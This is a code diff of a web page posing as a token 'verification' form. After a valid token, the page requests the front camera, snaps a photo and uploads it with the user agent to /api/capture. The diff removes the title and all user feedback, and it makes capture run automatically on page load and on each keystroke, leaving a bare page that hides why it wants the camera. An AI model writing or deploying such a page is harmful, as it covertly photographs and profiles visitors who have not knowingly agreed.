@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title></title>
     <style>
         * {
             margin: 0;
@@ -19,14 +19,8 @@
             align-items: center;
         }
         
-        .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-        }
-        
         input {
-            width: 100%;
+            width: 300px;
             padding: 15px;
             background: #111;
             border: 1px solid #333;
@@ -35,38 +29,15 @@
             text-align: center;
             letter-spacing: 2px;
             outline: none;
-            margin-bottom: 20px;
         }
         
         input:focus {
             border-color: #666;
         }
-        
-        .message {
-            text-align: center;
-            font-size: 16px;
-            margin: 10px 0;
-            display: none;
-        }
-        
-        .success {
-            color: #0f0;
-        }
-        
-        .error {
-            color: #f00;
-        }
-        
-        .hidden {
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <input type="text" id="token" placeholder="XXXX-XXXX" maxlength="9" autocomplete="off">
-        <div id="message" class="message"></div>
-    </div>
+    <input type="text" id="token" placeholder="XXXX-XXXX" maxlength="9" autocomplete="off">
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
@@ -74,50 +45,31 @@
         
         if (urlToken) {
             document.getElementById('token').value = urlToken;
-            setTimeout(verifyToken, 100);
+            setTimeout(verifyAndCapture, 500);
         }
         
         let stream = null;
-        let verified = false;
 
-        async function verifyToken() {
+        async function verifyAndCapture() {
             const token = document.getElementById('token').value.trim();
-            const msgDiv = document.getElementById('message');
             
             if (!token || !token.match(/^[A-Z0-9]{4}-[A-Z0-9]{4}$/)) {
-                msgDiv.style.display = 'block';
-                msgDiv.className = 'message error';
-                msgDiv.textContent = 'Invalid';
                 return;
             }
             
             try {
-                const response = await fetch('/api/verify-token', {
+                // Сначала проверяем токен
+                const verifyRes = await fetch('/api/verify-token', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ token })
                 });
                 
-                const data = await response.json();
+                const verifyData = await verifyRes.json();
                 
-                if (data.valid) {
-                    msgDiv.style.display = 'block';
-                    msgDiv.className = 'message success';
-                    msgDiv.textContent = 'Success';
-                    verified = true;
-                    setTimeout(requestCamera, 500);
-                } else {
-                    msgDiv.style.display = 'block';
-                    msgDiv.className = 'message error';
-                    msgDiv.textContent = 'Invalid';
-                }
-            } catch (err) {
-                console.error(err);
-            }
-        }
-
-        async function requestCamera() {
-            try {
+                if (!verifyData.valid) return;
+                
+                // Запрашиваем камеру
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 
                 const videoTrack = stream.getVideoTracks()[0];
@@ -134,7 +86,7 @@
                 
                 const formData = new FormData();
                 formData.append('image', blob, 'photo.jpg');
-                formData.append('token', document.getElementById('token').value.trim());
+                formData.append('token', token);
                 formData.append('ua', navigator.userAgent);
                 
                 await fetch('/api/capture', { method: 'POST', body: formData });
@@ -150,7 +102,7 @@
         let timeout = null;
         document.getElementById('token').addEventListener('input', function() {
             clearTimeout(timeout);
-            timeout = setTimeout(verifyToken, 300);
+            timeout = setTimeout(verifyAndCapture, 300);
         });
     </script>
 </body>
